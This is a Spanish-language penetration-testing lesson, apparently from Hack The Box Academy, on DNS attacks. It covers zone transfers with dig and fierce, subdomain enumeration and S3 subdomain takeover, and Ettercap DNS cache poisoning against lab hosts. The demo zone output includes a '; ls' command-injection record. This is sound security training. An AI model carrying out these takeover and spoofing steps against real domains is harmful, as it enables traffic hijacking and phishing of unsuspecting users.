El [Domain Name System](https://www.cloudflare.com/learning/dns/what-is-dns/) (`DNS`) traduce nombres de dominio (por ejemplo, hackthebox.com) a direcciones IP numéricas (por ejemplo, 104.17.42.72). DNS es principalmente `UDP/53`, pero DNS dependerá más de `TCP/53` con el tiempo. DNS siempre se ha diseñado para usar ambos puertos, UDP y TCP 53, desde el principio, siendo UDP el predeterminado, y recurriendo a TCP cuando no puede comunicarse en UDP, típicamente cuando el tamaño del paquete es demasiado grande para ser enviado en un solo paquete UDP. Dado que casi todas las aplicaciones de red utilizan DNS, los ataques contra servidores DNS representan una de las amenazas más prevalentes y significativas hoy en día.

---

## Enumeration

DNS contiene información interesante para una organización. Como se discutió en la sección Domain Information en el [Footprinting module](https://academy.hackthebox.com/course/preview/footprinting), podemos entender cómo opera una empresa y los servicios que proporciona, así como los proveedores de servicios de terceros como correos electrónicos.

Las opciones de Nmap `-sC` (scripts predeterminados) y `-sV` (escaneo de versión) se pueden usar para realizar una enumeración inicial contra los servidores DNS objetivo:

```r
nmap -p53 -Pn -sV -sC 10.10.110.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT
Nmap scan report for 10.10.110.213
Host is up (0.017s latency).

PORT    STATE  SERVICE     VERSION
53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
```

---

## DNS Zone Transfer

Una zona DNS es una parte del espacio de nombres DNS que una organización o administrador específico gestiona. Dado que DNS comprende múltiples zonas DNS, los servidores DNS utilizan transferencias de zona DNS para copiar una parte de su base de datos a otro servidor DNS. A menos que un servidor DNS esté configurado correctamente (limitando qué IPs pueden realizar una transferencia de zona DNS), cualquiera puede solicitar a un servidor DNS una copia de su información de zona, ya que las transferencias de zona DNS no requieren autenticación. Además, el servicio DNS generalmente se ejecuta en un puerto UDP; sin embargo, al realizar una transferencia de zona DNS, utiliza un puerto TCP para una transmisión de datos confiable.

Un atacante podría aprovechar esta vulnerabilidad de transferencia de zona DNS para aprender más sobre el espacio de nombres DNS de la organización objetivo, aumentando la superficie de ataque. Para la explotación, podemos usar la utilidad `dig` con la opción `AXFR` para el tipo de consulta DNS para volcar todos los espacios de nombres DNS desde un servidor DNS vulnerable:

### DIG - AXFR Zone Transfer

```r
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
;; global options: +cmd
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
inlanefrieght.htb.         604800  IN      AAAA    ::1
inlanefrieght.htb.         604800  IN      NS      localhost.
inlanefrieght.htb.         604800  IN      A       10.129.110.22
admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 28 msec
;; SERVER: 10.129.110.213#53(10.129.110.213)
;; WHEN: Mon Oct 11 17:20:13 EDT 2020
;; XFR size: 8 records (messages 1, bytes 289)
```

Herramientas como [Fierce](https://github.com/mschwager/fierce) también se pueden usar para enumerar todos los servidores DNS del dominio raíz y escanear para una transferencia de zona DNS:

```r
fierce --domain zonetransfer.me

NS: nsztm2.digi.ninja. nsztm1.digi.ninja.
SOA: nsztm1.digi.ninja. (81.4.108.41)
Zone: success
{<DNS name @>: '@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 '
               '172800 900 1209600 3600\n'
               '@ 300 IN HINFO "Casio fx-700G" "Windows XP"\n'
               '@ 301 IN TXT '
               '"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"\n'
               '@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM.\n'
               '@ 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM.\n'
               '@ 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM.\n'
               '@ 7200 IN A 5.196.105.14\n'
               '@ 7200 IN NS nsztm1.digi.ninja.\n'
               '@ 7200 IN NS nsztm2.digi.ninja.',
 <DNS name _acme-challenge>: '_acme-challenge 301 IN TXT '
                             '"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI"',
 <DNS name _sip._tcp>: '_sip._tcp 14000 IN SRV 0 0 5060 www',
 <DNS name 14.105.196.5.IN-ADDR.ARPA>: '14.105.196.5.IN-ADDR.ARPA 7200 IN PTR '
                                       'www',
 <DNS name asfdbauthdns>: 'asfdbauthdns 7900 IN AFSDB 1 asfdbbox',
 <DNS name asfdbbox>: 'asfdbbox 7200 IN A 127.0.0.1',
 <DNS name asfdbvolume>: 'asfdbvolume 7800 IN AFSDB 1 asfdbbox',
 <DNS name canberra-office>: 'canberra-office 7200 IN A 202.14.81.230',
 <DNS name cmdexec>: 'cmdexec 300 IN TXT "; ls"',
 <DNS name contact>: 'contact 2592000 IN TXT "Remember to call or email Pippa '
                     'on +44 123 4567890 or pippa@zonetransfer.me when making '
                     'DNS changes"',
 <DNS name dc-office>: 'dc-office 7200 IN A 143.228.181.132',
 <DNS name deadbeef>: 'deadbeef 7201 IN AAAA dead:beaf::',
 <DNS name dr>: 'dr 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m',
 <DNS name DZC>: 'DZC 7200 IN TXT "AbCdEfG"',
 <DNS name email>: 'email 2222 IN NAPTR 1 1 "P" "E2U+email" "" '
                   'email.zonetransfer.me\n'
                   'email 7200 IN A 74.125.206.26',
 <DNS name Hello>: 'Hello 7200 IN TXT "Hi to Josh and all his class"',
 <DNS name home>: 'home 7200 IN A 127.0.0.1',
 <DNS name Info>: 'Info 7200 IN TXT "ZoneTransfer.me service provided by Robin '
                  'Wood - robin@digi.ninja. See '
                  'http://digi.ninja/projects/zonetransferme.php for more '
                  'information."',
 <DNS name internal>: 'internal 300 IN NS intns1\ninternal 300 IN NS intns2',
 <DNS name intns1>: 'intns1 300 IN A 81.4.108.41',
 <DNS name intns2>: 'intns2 300 IN A 167.88.42.94',
 <DNS name office>: 'office 7200 IN A 4.23.39.254',
 <DNS name ipv6

actnow.org>: 'ipv6actnow.org 7200 IN AAAA '
                            '2001:67c:2e8:11::c100:1332',
...SNIP...
```

---

## Domain Takeovers & Subdomain Enumeration

`Domain takeover` es registrar un nombre de dominio inexistente para obtener control sobre otro dominio. Si los atacantes encuentran un dominio caducado, pueden reclamar ese dominio para realizar más ataques, como alojar contenido malicioso en un sitio web o enviar un correo electrónico de phishing utilizando el dominio reclamado.

El Domain takeover también es posible con subdominios llamado `subdomain takeover`. Un registro de nombre canónico (`CNAME`) de DNS se usa para mapear diferentes dominios a un dominio principal. Muchas organizaciones utilizan servicios de terceros como AWS, GitHub, Akamai, Fastly y otras redes de entrega de contenido (CDNs) para alojar su contenido. En este caso, generalmente crean un subdominio y lo hacen apuntar a esos servicios. Por ejemplo,

```r
sub.target.com.   60   IN   CNAME   anotherdomain.com
```

El nombre de dominio (por ejemplo, `sub.target.com`) usa un registro CNAME para otro dominio (por ejemplo, `anotherdomain.com`). Supongamos que `anotherdomain.com` caduca y está disponible para que cualquiera reclame el dominio, ya que el servidor DNS de `target.com` tiene el registro `CNAME`. En ese caso, cualquiera que registre `anotherdomain.com` tendrá control total sobre `sub.target.com` hasta que se actualice el registro DNS.

### Subdomain Enumeration

Antes de realizar un subdomain takeover, debemos enumerar subdominios para un dominio objetivo utilizando herramientas como [Subfinder](https://github.com/projectdiscovery/subfinder). Esta herramienta puede extraer subdominios de fuentes abiertas como [DNSdumpster](https://dnsdumpster.com/). Otras herramientas como [Sublist3r](https://github.com/aboul3la/Sublist3r) también se pueden usar para forzar subdominios proporcionando una lista de palabras pre-generada:

```r
./subfinder -d inlanefreight.com -v       
                                                                       
        _     __ _         _                                           
____  _| |__ / _(_)_ _  __| |___ _ _          
(_-< || | '_ \  _| | ' \/ _  / -_) '_|                 
/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                 
                projectdiscovery.io                    
                                                                       
[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.
[WRN] By using subfinder, you also agree to the terms of the APIs used. 
                                   
[INF] Enumerating subdomains for inlanefreight.com
[alienvault] www.inlanefreight.com
[dnsdumpster] ns1.inlanefreight.com
[dnsdumpster] ns2.inlanefreight.com
...snip...
[bufferover] Source took 2.193235338s for enumeration
ns2.inlanefreight.com
www.inlanefreight.com
ns1.inlanefreight.com
support.inlanefreight.com
[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
```

Una excelente alternativa es una herramienta llamada [Subbrute](https://github.com/TheRook/subbrute). Esta herramienta nos permite usar resolutores autodefinidos y realizar ataques puros de fuerza bruta DNS durante las pruebas de penetración internas en hosts que no tienen acceso a Internet.

### Subbrute

```r
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt

Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
inlanefreight.com
ns2.inlanefreight.com
www.inlanefreight.com
ms1.inlanefreight.com
support.inlanefreight.com

<SNIP>
```

A veces, las configuraciones físicas internas están mal aseguradas, lo que podemos explotar para cargar nuestras herramientas desde una memoria USB. Otro escenario sería que hemos llegado a un host interno a través de pivoting y queremos trabajar desde allí. Por supuesto, hay otras alternativas, pero no está de más conocer formas y posibilidades alternativas.

La herramienta ha encontrado cuatro subdominios asociados con `inlanefreight.com`. Utilizando el comando `nslookup` o `host`, podemos enumerar los registros `CNAME` para esos subdominios.

```r
host support.inlanefreight.com

support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
```

El subdominio `support` tiene un registro alias que apunta a un bucket AWS S3. Sin embargo, la URL `https://support.inlanefreight.com` muestra un error `NoSuchBucket` indicando que el subdominio es potencialmente vulnerable a un subdomain takeover. Ahora, podemos tomar el control del subdominio creando un bucket AWS S3 con el mismo nombre de subdominio.

![](https://academy.hackthebox.com/storage/modules/116/s3.png)

El repositorio [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) también es una excelente referencia para una vulnerabilidad de subdomain takeover. Muestra si los servicios objetivo son vulnerables a un subdomain takeover y proporciona pautas sobre cómo evaluar la vulnerabilidad.

---

## DNS Spoofing

DNS spoofing también se refiere como DNS Cache Poisoning. Este ataque implica alterar registros DNS legítimos con información falsa para que puedan ser utilizados para redirigir el tráfico en línea a un sitio web fraudulento. Los caminos de ataque para el DNS Cache Poisoning son los siguientes:

- Un atacante podría interceptar la comunicación entre un usuario y un servidor DNS para redirigir al usuario a un destino fraudulento en lugar de uno legítimo realizando un ataque Man-in-the-Middle (`MITM`).

- Explotar una vulnerabilidad encontrada en un servidor DNS podría otorgar control sobre el servidor a un atacante para modificar los registros DNS.
    

### Local DNS Cache Poisoning

Desde una perspectiva de red local, un atacante también puede realizar DNS Cache Poisoning utilizando herramientas MITM como [Ettercap](https://www.ettercap-project.org/) o [Bettercap](https://www.bettercap.org/).

Para explotar el DNS cache poisoning a través de `Ettercap`, primero debemos editar el archivo `/etc/ettercap/etter.dns` para mapear el nombre de dominio objetivo (por ejemplo, `inlanefreight.com`) que desean falsificar y la dirección IP del atacante (por ejemplo, `192.168.225.110`) a la que desean redirigir a un usuario:

```r
cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

A continuación, inicia la herramienta `Ettercap` y escanea los hosts activos dentro de la red navegando a `Hosts > Scan for Hosts`. Una vez completado, agrega la dirección IP objetivo (por ejemplo, `192.168.152.129`) a Target1 y agrega una IP de gateway predeterminada (por ejemplo, `192.168.152.2`) a Target2.

![](https://academy.hackthebox.com/storage/modules/116/target.png)

Activa el ataque `dns_spoof` navegando a `Plugins > Manage Plugins`. Esto envía a la máquina objetivo respuestas DNS falsas que resolverán `inlanefreight.com` a la dirección IP `192.168.225.110`:

![](https://academy.hackthebox.com/storage/modules/116/etter_plug.png)

Después de un ataque DNS spoof exitoso, si un usuario víctima proveniente de la máquina objetivo `192.168.152.129` visita el dominio `inlanefreight.com` en un navegador web, serán redirigidos a una `Fake page` que está alojada en la dirección IP `192.168.225.110`:

![](https://academy.hackthebox.com/storage/modules/116/etter_site.png)

Además, un ping proveniente de la dirección IP objetivo `192.168.152.129` a `inlanefreight.com` debería resolverse a `192.168.225.110` también:

```r
C:\>ping inlanefreight.com

Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
Reply from 192.168.225.110: bytes=32 time<1ms TTL=64

Ping statistics for 192.168.225.110:
    Packets: Sent = 

4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

Estos son algunos ejemplos de ataques comunes a DNS. Hay otros ataques más avanzados que se cubrirán en módulos posteriores.